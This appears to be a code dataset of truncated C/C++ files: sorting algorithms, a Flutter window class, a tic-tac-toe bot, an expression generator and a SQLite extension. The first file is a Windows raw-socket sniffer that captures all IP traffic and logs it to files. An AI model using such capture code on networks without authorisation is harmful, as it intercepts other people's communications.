\"inet_ntop failed with error: \" << WSAGetLastError() << std::endl;\n        return false;\n    }\n    if (strcmp(dest_ip, \"127.0.0.1\") == 0) {\n        // Skip packet if destination address is 127.0.0.1\n        return false;\n    }\n    return true;\n}\n\nstd::string generateFileName() {\n    auto now = std::chrono::system_clock::now();\n    std::time_t now_c = std::chrono::system_clock::to_time_t(now);\n    struct tm local_time;\n    localtime_s(&local_time, &now_c);\n\n    std::ostringstream oss;\n    oss << \"sniff_\";\n    oss << std::put_time(&local_time, \"%Y%m%d_%H%M%S\");\n    oss << \".txt\";\n    return oss.str();\n}\n\nbool initializeWinsock(WSADATA& wsaData) {\n    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);\n    if (result != 0) {\n        std::cerr << \"WSAStartup failed: \" << result << std::endl;\n        return false;\n    }\n    return true;\n}\n\nSOCKET createRawSocket() {\n    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP);\n    if (sock == INVALID_SOCKET) {\n        std::cerr << \"Failed to create socket: \" << WSAGetLastError() << std::endl;\n    }\n    return sock;\n}\n\nbool bindSocket(SOCKET sock) {\n    SOCKADDR_IN addr;\n    addr.sin_family = AF_INET;\n    addr.sin_addr.s_addr = htonl(INADDR_ANY); // Listen on all interfaces\n    addr.sin_port = 0;\n\n    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {\n        std::cerr << \"Bind failed with error: \" << WSAGetLastError() << std::endl;\n        return false;\n    }\n    return true;\n}\n\n\nvoid packetWriter(std::ofstream& outputFile, std::queue<std::pair<std::vector<char>, std::string>>& packetQueue, std::mutex& queueMutex, std::condition_variable& cv, bool& done) {\n    while (!done || !packetQueue.empty()) {\n        std::unique_lock<std::mutex> lock(queueMutex);\n        cv.wait(lock, [&]() { return !packetQueue.empty() || done; });\n        while (!packetQueue.empty()) {\n            auto packetData = packetQueue.front();\n            packetQueue.pop();\n            lock.unlock();\n            auto packet = packetData.first;\n            auto info = packetData.second;\n            outputFile << info << \" \";\n            for (const auto& byte : packet) {\n                outputFile << std::hex << std::setw(2) << std::setfill('0') << (static_cast<unsigned int>(static_cast<unsigned char>(byte))) << \"\";\n            }\n            outputFile << std::endl;\n            lock.lock();\n        }\n    }\n}\n\nvoid packetReader(const std::string& filename, std::mutex& queueMutex, std::condition_variable& cv, bool& done) {\n    char ch;\n    std::string filter = \"\";\n    int filter_column = 0;\n    int start_index = 0;\n    const int max_display = 30;\n    while (true) {\n        std::vector<Packet> packets = read_packets_from_file(filename);\n\n        if (packets.size() > 30) {\n            packets.resize(30);\n        }\n\n        std::cout << \"\\nEnter column number to filter (1-4), 'r' to reset, 'u' to scroll up, 'd' to scroll down, or 'q' to quit: \";\n        std::cin >> ch;\n        if (ch == 'q' || ch == 'Q') {\n            break;\n        }\n        else if (ch == 'r' || ch == 'R') {\n            filter = \"\";\n            filter_column = 0;\n            start_index = 0;\n            display_packets(packets, filter, filter_column, start_index, max_display);\n            continue;\n        }\n        else if (ch == 'u' || ch == 'U') {\n            if (start_index > 0) {\n                start_index -= max_display;\n                if (start_index < 0) start_index = 0;\n                display_packets(packets, filter, filter_column, start_index, max_display);\n            }\n            el",
    "#include <bits/stdc++.h>\r\n#define MAXSIZE 10\r\nusing namespace std;\r\n\r\nvoid iniArr(int arr[], int length) {\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tarr[i] = rand() % 20;\r\n\t}\r\n}\r\n\r\nvoid showArr(int arr[], int length) {\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tcout << arr[i] << \" \";\r\n\t}\r\n\tcout << endl << \"------------\";\r\n}\r\n\r\n//\u5192\u6ce1\u6392\u5e8f\r\nvoid bubSort(int arr[], int length) {\r\n\twhile (length--)\r\n\t{\r\n\t\tfor (int i = 0; i < length; i++) {\r\n\t\t\tif (arr[i + 1] < arr[i]) {\r\n\t\t\t\tint temp = arr[i + 1];\r\n\t\t\t\tarr[i + 1] = arr[i];\r\n\t\t\t\tarr[i] = temp;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\n//\u9009\u62e9\u6392\u5e8f\r\nvoid selectSort(int arr[], int length) {\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tint k = i;\r\n\t\tfor (int j = i + 1; j < length; j++) {\r\n\t\t\tif (arr[j] < arr[k]) {\r\n\t\t\t\tk = j;\r\n\t\t\t}\r\n\t\t}\r\n\t\tint temp = arr[i];\r\n\t\tarr[i] = arr[k];\r\n\t\tarr[k] = temp;\r\n\r\n\t}\r\n}\r\n\r\n\r\n//\u63d2\u5165\u6392\u5e8f\r\nvoid insertSort(int arr[], int length) {\r\n\tfor (int i = 1; i < length; i++) {\r\n\t\tint key = arr[i];\r\n\t\tint j = i - 1;\r\n\r\n\t\t// \u5c06\u5143\u7d20arr[i]\u63d2\u5165\u5230\u5df2\u6392\u5e8f\u7684\u5e8f\u5217arr[0..i-1]\u4e2d  \r\n\t\twhile (j >= 0 && arr[j] > key) {\r\n\t\t\tarr[j + 1] = arr[j];\r\n\t\t\tj--;\r\n\t\t}\r\n\t\tarr[j + 1] = key;\r\n\t}\r\n}\r\n\r\n//\u63d2\u5165\u65b0\u7684\u5143\u7d20\r\nvoid insertElement(int arr[], int length, int newElement) {\r\n\tint i;\r\n\tfor (i = length - 1; (i >= 0 && arr[i] > newElement); i--) {\r\n\t\tarr[i + 1] = arr[i]; // \u5c06\u5143\u7d20\u5411\u540e\u79fb\u52a8  \r\n\t}\r\n\tarr[i + 1] = newElement; // \u63d2\u5165\u65b0\u5143\u7d20  \r\n\r\n\t// \u6ce8\u610f\uff1a\u7531\u4e8e\u6570\u7ec4\u5927\u5c0f\u56fa\u5b9a\uff0c\u8fd9\u91cc\u7684\u201c\u63d2\u5165\u201d\u5b9e\u9645\u4e0a\u662f\u8986\u76d6\u4e86\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u3002  \r\n\t// \u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u60a8\u53ef\u80fd\u9700\u8981\u91cd\u65b0\u5206\u914d\u6570\u7ec4\u7684\u5927\u5c0f\u6765\u771f\u6b63\u63d2\u5165\u4e00\u4e2a\u65b0\u5143\u7d20\u3002  \r\n}\r\n\r\n//\u5e0c\u5c14\u6392\u5e8f\r\nvoid shellSort(int arr[], int length) {\r\n\tint h = 1;\r\n\tint t = length / 3;\r\n\twhile (h<t)\r\n\t{\r\n\t\th = 3 * h - 1;\r\n\t}\r\n\twhile (h >= 1) {\r\n\t\tfor (int i = h; i < length; i++) {\r\n\t\t\tfor (int j = i; j >= h && arr[j] < arr[j - h]; j--) {\r\n\t\t\t\tint temp = arr[j];\r\n\t\t\t\tarr[j] = arr[j - h];\r\n\t\t\t\tarr[j - h] = temp;\r\n\t\t\t}\r\n\t\t}\r\n\t\th /= 3;\r\n\t}\r\n}\r\n\r\n//\u5feb\u901f\u6392\u5e8f\r\nvoid quickSort(int arr[], int left, int right) {\r\n\tif (left >= right) {\r\n\t\treturn;\r\n\t}\r\n\tint i = left;\r\n\tint j = right;\r\n\tint pivot = arr[i];\r\n\twhile (i < j)\r\n\t{\r\n\t\twhile (i < j && arr[j] >= pivot)\r\n\t\t\tj--;\r\n\t\t\tarr[i] = arr[j];\r\n\t\twhile (i < j && arr[i] <= pivot)\r\n\t\t\t\t\ti++;\r\n\t\t\tarr[j] = arr[i];\r\n\t}\r\n\t//\u5f53j=i\u65f6\uff0c\u8f74\u786e\u5b9a\r\n\tarr[i] = pivot;\r\n\tquickSort(arr, left, i - 1);\r\n\tquickSort(arr, i + 1, right);\r\n}\r\n\r\n//\u5f52\u5e76\u6392\u5e8f\r\n//\u9ed8\u8ba4\u5e8f\u5217a\u4e0e\u5e8f\u5217b\u90fd\u662f\u6709\u5e8f\u5e8f\u5217\r\nvoid mergesort1(int aArr[], int alen, int bArr[], int blen, int* temp) {\r\n\tint i = 0;\r\n\tint j = 0;\r\n\tint k = 0;\r\n\twhile (i < alen && j < blen)\r\n\t{\r\n\t\t//\u4f7f\u7528\u4e09\u76ee\u8fd0\u7b97\u7b26\u4f7f\u4ee3\u7801\u66f4\u52a0\u7b80\u6d01\r\n\t\ttemp[k++] = aArr[i] < bArr[j] ? aArr[i++] : bArr[j++];\r\n\t}\r\n\twhile (i < alen)\r\n\t{\r\n\t\ttemp[k++] = aArr[i++];\r\n\t}\r\n\twhile (j < blen)\r\n\t{\r\n\t\ttemp[k++] = bArr[j++];\r\n\t}\r\n}\r\n\r\n//\u65e0\u5e8f\u5e8f\u5217\uff0c\u5c06\u5176\u62c6\u5206\u5f00\uff0c\u8ba9\u5176\u6210\u4e3a\u6709\u5e8f\u7684\u591a\u4e2a\u5e8f\u5217\r\nvoid merge(int arr[], int low, int mid, int higth, int* temp) {\r\n\tint i = low;\r\n\tint j = mid + 1;\r\n\tint k = low;\r\n\twhile (i <= mid && j <= higth)\r\n\t{\r\n\t\ttemp[k++] = arr[i] < arr[j] ? arr[i++] : arr[j++];\r\n\t}\r\n\twhile (i <= mid) {\r\n\t\ttemp[k++] = arr[i++];\r\n\t}\r\n\twhile (j <= higth) {\r\n\t\ttemp[k++] = arr[j++];\r\n\t}\r\n\tfor (i = low; i <= higth; i++) {\r\n\t\tarr[i] = temp[i];\r\n\t}\r\n}\r\n\r\nvoid merge_sort(int arr[], int low, int higth, int* temp) {\r\n\tif (low >= higth) {\r\n\t\treturn;\r\n\t}\r\n\tint mid = low + (higth - low) / 2;//(low+higth)/2;\r\n\tmerge_sort(arr, low, mid, temp);\r\n\tmerge_sort(arr, mid + 1, higth, temp);\r\n\tmerge(arr, low, mid, higth, temp);\r\n}\r\n\r\nvoid mergesort2(int arr[], int length) {\r\n\tint* temp = new int[length];\r\n\tassert(temp);\r\n\tmerge_sort(arr, 0, length - 1, temp);\r\n\tdelete[] temp;\r\n}\r\n\r\n//\u5165\u5806\uff08\u5185\u5806\uff09\r\nvoid pushHeap(int* heap, int& size, int data) {\r\n\theap[size] = data;\r\n\tint current = size;\r\n\tint parent = (current - 1) / 2;\r\n\twhile (current > 0 && heap[current] < heap[parent]) {\r\n\t\tswap(heap[current], heap[parent]);\r\n\t\tcurrent = parent;\r\n\t\tparent = (current - 1) / 2;\r\n\t}\r\n\tsize++;\r\n}\r\n\r\n//\u51fa\u5806\uff08\u5185\u5806\uff09\r\nint popHeap(int* heap, int& size) {\r\n\tint val = heap[0];\r\n\theap[0] = heap[size - 1];\r\n\tsize--;\r\n\tint current = 0;\r\n\tint child = 2 * current + 1;\r\n\twhile (child < size) {\r\n\t\tif (child + 1 < size && heap[child + 1] < heap[child])\r\n\t\t\tchild++;\r\n\t\tif (heap[child] >= heap[current])\r\n\t\t\tbreak;\r\n\t\tswap(heap[child], heap[current]);\r\n\t\tcurrent = child;\r\n\t\tchild = 2 * current + 1;\r\n\t}\r\n\treturn val;\r\n}\r\n\r\n//\u5806\u6392\u5e8f\u5b9e\u73b0\uff08\u5185\u5806\uff09\r\nvoid heapsort1(int* arr, int length) {\r\n\tint* heap = new int[length];\r\n\tint heapSize = 0;\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tpushHeap(heap, heapSize, arr[i]);\r\n\t}\r\n\tfor (int i = 0; i < length; i++) {\r\n\t\tarr[i] = popHeap(heap, heapSize);\r\n\t}\r\n\tdelete[] heap;\r\n}\r\n\r\n// \u8c03\u6574\u5806\uff08\u5916\u5806\uff09\r\nvoid heapify(int arr[], int n, int i) {\r\n\tint largest = i;  // \u521d\u59cb\u5316\u6700\u5927\u5143\u7d20\u4e3a\u6839\u8282\u70b9\r\n\tint left = 2 * i + 1;  // \u5de6\u5b50\u8282\u70b9\u7684\u7d22\u5f15\r\n\tint right = 2 * i + 2;  // \u53f3\u5b50\u8282\u70b9\u7684\u7d22\u5f15\r\n\r\n\t// \u5982\u679c\u5de6\u5b50\u8282\u70b9\u5927\u4e8e\u6839\u8282\u70b9\r\n\tif (left < n && arr[left] > arr[largest]) {\r\n\t\tlargest = left;\r\n\t}\r\n\r\n\t// \u5982\u679c\u53f3\u5b50\u8282\u70b9\u5927\u4e8e\u5f53\u524d\u6700\u5927\u8282\u70b9\r\n\tif (right < n && arr[right] > arr[largest]) {\r\n\t\tlargest = right;\r\n\t}\r\n\r\n\t// \u5982\u679c\u6700\u5927\u8282\u70b9\u4e0d\u662f\u6839\u8282\u70b9\r\n\tif (largest != i) {\r\n\t\tswap(arr[i], arr[largest]);\r\n\t\t// \u9012\u5f52\u8c03\u6574\u5b50\u6811\r\n\t\theapify(arr, n, largest);\r\n\t}\r\n}\r\n\r\n// \u5806\u6392\u5e8f\uff08\u5916\u5806\uff09\r\nvoid heapSort(int arr[], int n) {\r\n\t// \u6784\u5efa\u6700\u5927\u5806\uff08\u4ece\u6700\u540e\u4e00\u4e2a\u975e\u53f6\u5b50\u8282\u70b9\u5f00\u59cb\uff09\r\n\tfor (int i = n / 2 - 1; i >= 0; i--) {\r\n\t\theapify(arr, n, i);\r\n\t}\r\n\r\n\t// \u9010\u4e2a\u4ece\u5806\u9876\u53d6\u51fa\u5143\u7d20\uff0c\u653e\u5230\u5df2\u6392\u5e8f\u533a\u95f4\u672b\u5c3e\r\n\tfor (int i = n - 1; i > ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <time.h>\n#include \"functions.h\"\n\nvoid bot_vs_bot()\n{\n    int matris[3][3], sayac_1 = 0;\n    matrisi_initialize_et(&matris[0][0], 3, 3); // T\u00fcm oyun matrisini bo\u015f yerlerle, yani 0 de\u011ferleriyle ba\u015flat\n\n    for (int i = 0; i < 10; i++)\n    {\n        oyun_tahtasini_yazdir(matris); // Oyun matrisini yazd\u0131r\n        bot(matris, 1);                // Bot 1 i\u00e7in bir hamle yap\n\n        if (kazanan_kontrolu(matris, 1) > 0) // Bot 1'in kazan\u0131p kazanmad\u0131\u011f\u0131n\u0131 kontrol et\n        {\n            oyun_tahtasini_yazdir(matris);\n            printf(\"Bot_1 kazand\u0131\");\n            return;\n        }\n        i++;                           // Hamle say\u0131s\u0131n\u0131 artt\u0131r\n        oyun_tahtasini_yazdir(matris); // Oyun matrisini yazd\u0131r\n        bot(matris, 2);                // Bot 2 i\u00e7in bir hamle yap\n\n        if (kazanan_kontrolu(matris, 1) > 0) // Bot 2'nin kazan\u0131p kazanmad\u0131\u011f\u0131n\u0131 kontrol et\n        {\n            oyun_tahtasini_yazdir(matris);\n            printf(\"Bot_2 kazand\u0131\");\n            return;\n        }\n        if (i == 9) // Toplam 9 hamle yap\u0131ld\u0131ktan sonra kontrol et\n        {\n            oyun_tahtasini_yazdir(matris);\n            return;\n        }\n    }\n\n    return;\n}\n",
    "#include \"Expression.h\"\n\n\n// \u9690\u85cf\u5bf9\u751f\u6210\u5177\u4f53\u5bf9\u5e94\u7684\u8868\u8fbe\u5f0f\u7684\u7ec6\u8282\nint Expression::Judge_Priority(char ch1, char ch2) // \u5224\u65ad\u8fd0\u7b97\u7b26ch1, ch2\u4f18\u5148\u7ea7\n{\n\tif (ch1 == '+' || ch1 == '-')\n\t{\n\t\tif (ch2 == '*' || ch2 == '/' || ch2 == '(')\n\t\t{\n\t\t\treturn -1;\n\t\t}\n\t\t    return 2;\n\t}\n\telse if (ch1 == '*' || ch1 == '/')\n\t{\n\t\tif (ch2 == '(')\n\t\t{\n\t\t\treturn -1;\n\t\t}\n\t\t    return 2;\n\t}\n\telse if (ch1 == '(' || ch1 == ')')\n\t{\n\t\tif (ch1 == ')')\n\t\t{\n\t\t\treturn 2;\n\t\t}\n\t\tif (ch2 == ')')\n\t\t{\n\t\t\treturn 0;\n\t\t}\n\t\t    return -1;\n\t}\n\tif (ch2 != '#')\n\t{\n\t\treturn -1;\n\t}\n\t    return 0;\n}\n\nfloat Expression::Cal(float x, float y, char op) // \u5904\u7406\u7b80\u5355\u8fd0\u7b97\u5f0fx op y\u7684\u8fd0\u7b97\n{\n\tfloat value = 0;\n\tswitch (op)\n\t{\n\tcase '+':\n\t\tvalue = x + y;\n\t\tbreak;\n\tcase '-':\n\t\tvalue = y - x;\n\t\tbreak;\n\tcase '*':\n\t\tvalue = y * x * 1.0;\n\t\tbreak;\n\tdefault:\n\t\tvalue = y * 1.0 / x;\n\t\tbreak;\n\t}\n\treturn value;\n}\n\nstring Expression::Solve_Bracket(string s) // \u7ed9\u5b57\u7b26\u4e32\u968f\u673a\u52a0\u683c\u5f0f\u5339\u914d\u7684\u62ec\u53f7\n{\n\tmap<char, int> mp;\n\tstring Result = \"\";\n\tint num = 0, tag = 0;\n\tmp['+'] = mp['-'] = mp['*'] = mp['/'] = 1;\n\tfor (int i = 0; i < s.size(); i++)\n\t{\n\t\tResult += s[i];\n\t\tif (mp.count(s[i]))\n\t\t{\n\t\t\tnum++;\n\t\t}\n\t\tif (num >= 1 && (i + 1 < s.size() && mp.count(s[i + 1]) || (i == s.size() - 1)))\n\t\t{\n\t\t\tint l = Result.size() - 1, op = 0, num1 = 0;\n\t\t\tvector<int> path;\n\t\t\twhile (l >= 0)\n\t\t\t{\n\t\t\t\tif (Result[l] == ')')\n\t\t\t\t{\n\t\t\t\t\top++;\n\t\t\t\t}\n\t\t\t\tif (Result[l] == '(')\n\t\t\t\t{\n\t\t\t\t\top--;\n\t\t\t\t}\n\t\t\t\tif (l == 0 || l > 0 && mp.count(Result[l - 1]))\n\t\t\t\t{\n\t\t\t\t\tint randomNumber = rand() % 100;\n\t\t\t\t\tif (!op && num1 && randomNumber >= 50)\n\t\t\t\t\t{\n\t\t\t\t\t\tint r = rand() % 100;\n\t\t\t\t\t\tif (!tag || (!l && r <= 20) || l)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\ttag = 1;\n\t\t\t\t\t\t\tpath.push_back(l);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif (mp.count(Result[l]))\n\t\t\t\t{\n\t\t\t\t\tnum1++;\n\t\t\t\t}\n\t\t\t\t    l--;\n\t\t\t}\n\t\t\tint num = path.size();\n\t\t\tfor (int j = 0; j < path.size(); j++)\n\t\t\t{\n\t\t\t\tResult.insert(path[j], \"(\");\n\t\t\t\tResult.insert(Result.size(), \")\");\n\t\t\t}\n\t\t}\n\t}\n\treturn Result;\n}\n\nint Expression::Random_Num(int n) // \u4ea7\u751f0~n\u7684\u968f\u673a\u6570\n{\n\treturn rand() % (1 + abs(n));\n}\n\nstring Expression::Solve_Float(float X, int Is_Float) // \u5904\u7406\u6570\u636e\u662f\u5426\u4e3a\u5c0f\u6570\n{\n\tstring tmp = \"\", ops;\n\tif (Is_Float)\n\t{\n\t\tops = to_string(X);\n\t}\n\telse\n\t\tops = to_string((int)X);\n\tint num = 0, Is_Point = 0;\n\tfor (int i = 0; i < ops.size(); i++)\n\t{\n\t\ttmp += ops[i];\n\t\tif (ops[i] == '.')\n\t\t{\n\t\t\tIs_Point = 1;\n\t\t\tcontinue;\n\t\t}\n\t\tif (Is_Point)\n\t\t{\n\t\t\tnum++;\n\t\t}\n\t\tif (num >= 2)\n\t\t{\n\t\t\tbreak;\n\t\t}\n\t}\n\treturn tmp;\n}\n\nstring Expression::Solve_Complex( string s, int MaxV, int Is_Float) // \u751f\u6210\u590d\u6742\u8fd0\u7b97\u5f0f\n{\n\tstring ans = \"\";\n\tint op = Random_Num(4) + 5;\n\tif (op > 5) op = 5;\n\tvector<float> Op;\n\tmap<int, int> mp;\n\tif (s == \"\")\n\t{\n\t\ts = \"+-*/\";\n\t}\n\tfor (int i = 0; i < s.size(); i++)\n\t{\n\t\tif (s[i] == '/')\n\t\t{\n\t\t\tswap(s[i], s[s.size() - 1]);\n\t\t}\n\t}\n\tfor (int i = 0; i < op; i++)\n\t{\n\t\tint Num = Random_Num(MaxV);\n\t\tint left = 0;\n\t\tif (Is_Float)\n\t\t{\n\t\t\tleft = Random_Num(99);\n\t\t}\n\t\tOp.push_back(Num + left * 1.0 / 100);\n\t}\n\tfor (int i = 0; i < Op.size() - 1; i++)\n\t{\n\t\tint cnt = s.size() - 1;\n\t\tif (Op[i + 1] == 0 )\n\t\t{\n\t\t\tcnt = s.size() - 2;\n\t\t}\n\t\tint Ope = Random_Num(cnt);\n\t\tif (mp.count(Ope))\n\t\t{\n\t\t\tfor (int i = 0; i <= cnt; i++)\n\t\t\t{\n\t\t\t\tif (!mp.count(i))\n\t\t\t\t{\n\t\t\t\t\tOpe = i;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tmp[Ope] = 1;\n\t\tans += Solve_Float(Op[i], Is_Float);\n\t\tans += s[Ope];\n\t}\n\tans += Solve_Float(Op[Op.size() - 1], Is_Float);\n\treturn ans;\n}\n\nstring Expression::Procced_Expression(string s, int MaxV, int Is_Bracket, int Is_Float) // \u52a0\u5de5\u8fd0\u7b97\u5f0f\n{\n\tstring ans;\n\tfloat v, Max_Num = 1000000;\n\twhile (1)\n\t{\n\t\tans = Solve_Complex(s, MaxV, Is_Float);\n\t\tif (Is_Bracket)\n\t\t{\n\t\t\tans = Solve_Bracket(ans);\n\t\t}\n\t\tv = Calculate_Expression(ans);\n\t\tif (v >= 0 && v <= Max_Num)\n\t\t{\n\t\t\treturn ans;\n\t\t}\n\t}\n\treturn \"*\";\n}\n\n\nvector<string> Expression::Generate_Expression(int num, string s, int MaxV, int Is_Bracket, int Is_Float) // \u751f\u6210\u6ee1\u8db3num\u6570\u91cf\uff0c\u8fd0\u7b97\u7b26ops, \u6700\u5927\u6570MaxV, Is_Float\u662f\u5426\u5c0f\u6570\uff0cIs_Bracket\u662f\u5426\u52a0\u62ec\u53f7\n{\n\tvector<string> path;\n\tfor (int i = 0; i < num; i++)\n\t{\n\t\tpath.push_back(Procced_Expression(s, MaxV, Is_Bracket, Is_Float));\n\t}\n\treturn path;\n}\n\nfloat Expression::Calculate_Expression(string s) // \u5bf9\u8868\u8fbe\u5f0f\u7684\u503c\u8fdb\u884c\u8ba1\u7b97\n{\n\ts.push_back('#');\n\tint cnt = 0, len = s.size(), i = -1;\n\tstack<char> OPTR;\n\tOPTR.push('#');\n\tstack<float> OPND;\n\twhile (i < len || OPTR.top() != '#')\n\t{\n\t\ti++;\n\t\tif (i >= len)\n\t\t{\n\t\t\tfloat x = OPND.top();\n\t\t\tOPND.pop();\n\t\t\tfloat y = OPND.top();\n\t\t\tOPND.pop();\n\t\t\tchar op = OPTR.top();\n\t\t\tOPTR.pop();\n\t\t\tOPND.push(1.0 * Cal(y, x, op));\n\t\t\tcontinue;\n\t\t}\n\t\tif (s[i] >= '0' && s[i] <= '9')\n\t\t{\n\t\t\tint tag = 0;\n\t\t\tint j = i;\n\t\t\tfloat low = 0, k = 0.1;\n\t\t\twhile (j < len && s[j] >= '0' && s[j] <= '9' || s[j] == '.')\n\t\t\t{\n\t\t\t\tif (s[j] == '.')\n\t\t\t\t{\n\t\t\t\t\ttag = 1;\n\t\t\t\t\tj++;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tif (tag)\n\t\t\t\t{\n\t\t\t\t\tlow += (k * (s[j] - '0'));\n\t\t\t\t\tk *= 0.1;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tcnt = cnt * 10 + (s[j] - '0');\n\t\t\t\t}\n\t\t\t\tj++;\n\t\t\t}\n\t\t\tOPND.push(cnt * 1.0 + low);\n\t\t\tcnt = 0;\n\t\t\ti = j - 1;\n\t\t\tcontinue;\n\t\t}\n\t\tif (!(s[i] >= '0' && s[i] <= '9'))\n\t\t{\n\t\tINIT:\n\n\t\t\tchar op1 = OPTR.top(), op2 = s[i];\n\t\t\tint tag = Judge_Priority(op1, op2);\n\t\t\tif (tag == -1)\n\t\t\t{\n\t\t\t\tOPTR.push(",
    "#include <cstdio>\n#include <cassert>\n#include <cstdint>\n#include <chrono>\n#include <cstring>\n#include <string_view>\n\n#include <curl/curl.h>\n#include <json-c/json.h>\n\n#include <sqlite3ext.h> /* Do not use <sqlite3.h>! */\nSQLITE_EXTENSION_INIT1\n\nbool isValidHexChar(char c) {\n    return ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'));\n}\n\nstd::optional<std::string> normalize_uuid(std::string_view uuid) {\n    std::string out;\n    out.reserve(36);\n    int hyphens = 0;\n    int hex_chars = 0;\n    for (char c : uuid) {\n        if (c == '-') {\n            hyphens++;\n            if (hyphens > 4) return {}; // Too many hyphens\n        }\n        else if (isValidHexChar(c)) {\n            hex_chars++;\n            if (hex_chars > 32) return {}; // Too many hex chars\n            out.push_back(tolower(c));\n            if (hex_chars == 8 || hex_chars == 12 || hex_chars == 16 || hex_chars == 20) {\n                out.push_back('-');\n            }\n        } else {\n            return {}; // invalid uuid\n        }\n    }\n    if (hex_chars < 32) return {};\n    return out;\n}\n\nstruct Profile {\n    std::string uuid;\n    std::string name;\n};\n\nstd::optional<Profile> parse_profile(const char* json_str) {\n    json_object *json = json_tokener_parse(json_str);\n    json_object *name_obj{};\n    json_object *id_obj{};\n    if (json_object_object_get_ex(json, \"name\", &name_obj) && json_object_object_get_ex(json, \"id\", &id_obj)) {\n        // if not valid uuid this throws exception\n        auto normal_uuid = normalize_uuid(json_object_get_string(id_obj)).value();\n        return {Profile{\n            .uuid = std::move(normal_uuid),\n            .name = json_object_get_string(name_obj),\n        }};\n    }\n    return {};\n}\n\nsize_t write_callback(char* data, size_t size, size_t nmemb, std::string* str) {\n    str->append(data, size * nmemb);\n    return size * nmemb;\n}\n\nstd::optional<Profile> fetch_profile(const char* url, std::string* error_out) {\n    CURL *curl = curl_easy_init();\n    assert(curl);\n    curl_easy_setopt(curl, CURLOPT_URL, url);\n    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);\n    std::string response;\n    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);\n    char error[CURL_ERROR_SIZE];\n    curl_easy_setopt(curl, 